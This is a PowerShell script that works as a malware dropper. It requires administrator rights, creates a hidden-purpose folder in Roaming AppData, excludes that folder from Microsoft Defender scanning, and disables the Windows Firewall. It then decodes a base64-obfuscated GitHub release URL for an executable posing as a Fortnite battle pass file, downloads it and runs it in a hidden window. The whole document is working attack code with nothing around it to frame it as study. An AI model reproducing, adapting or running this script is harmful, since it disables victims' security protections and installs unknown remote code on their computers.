function Test-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
function Get-RoamingAppDataPath {
    return [Environment]::GetFolderPath('ApplicationData')
}
function Create-AutomFolder {
    param (
        [string]$FolderName = "autom"
    )
    $roamingPath = Get-RoamingAppDataPath
    $folderPath = Join-Path $roamingPath $FolderName
    
    try {
        if (-not (Test-Path $folderPath)) {
            New-Item -Path $folderPath -ItemType Directory -Force | Out-Null
        }
        return $folderPath
    } catch {
        return $null
    }
}
function Add-DefenderExclusion {
    param (
        [string]$Path
    )
    try {
        $currentExclusions = (Get-MpPreference).ExclusionPath
        if ($currentExclusions -contains $Path) {
            return $true
        }
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop -OutVariable null
        return $true
    } catch {
        return $false
    }
}
function Download-AndExecuteFile {
    param (
        [string]$DownloadUrl,
        [string]$DestinationFolder,
        [string]$FileName
    )
    $filePath = Join-Path $DestinationFolder $FileName
    try {
        Invoke-WebRequest -Uri $DownloadUrl -OutFile $filePath -ErrorAction Stop -OutVariable null
        Start-Process -FilePath $filePath -WindowStyle Hidden
        return $true
    } catch {
        return $false
    }
}
function Disable-WindowsFirewall {
    try {
        Set-NetFirewallProfile -Profile Domain, Private, Public -Enabled False -ErrorAction Stop -OutVariable null
        return $true
    } catch {
        return $false
    }
}
function Exit-IfFalse {
    param (
        [bool]$Condition
    )
    if (-not $Condition) {
        exit 1
    }
}
if ($MyInvocation.MyCommand.Name -eq (Get-Item $MyInvocation.MyCommand.Path).Name) {
    Exit-IfFalse (Test-Admin)
    $automFolderPath = Create-AutomFolder
    Exit-IfFalse ($automFolderPath -ne $null)
    Exit-IfFalse (Add-DefenderExclusion -Path $automFolderPath)
    Exit-IfFalse (Disable-WindowsFirewall)
    $downloadUrl = "aHR0cHM6Ly9naXRodWIuY29tL0hvYmJ5bG9zMTYxMi9TdGVhbUZybWVHYW11cy9yZWxlYXNlcy9kb3dubG9hZC9lZWVlZS9Gb3J0bml0ZUJhdHRsZXBhc3MuZXhl"
    $executableFileName = "Rm9ydG5pdGVCYXR0bGVwYXNzLmV4ZQ=="
    $downloadUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($downloadUrl))
    $executableFileName = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($executableFileName))
    Exit-IfFalse (Download-AndExecuteFile -DownloadUrl $downloadUrl -DestinationFolder $automFolderPath -FileName $executableFileName)
}
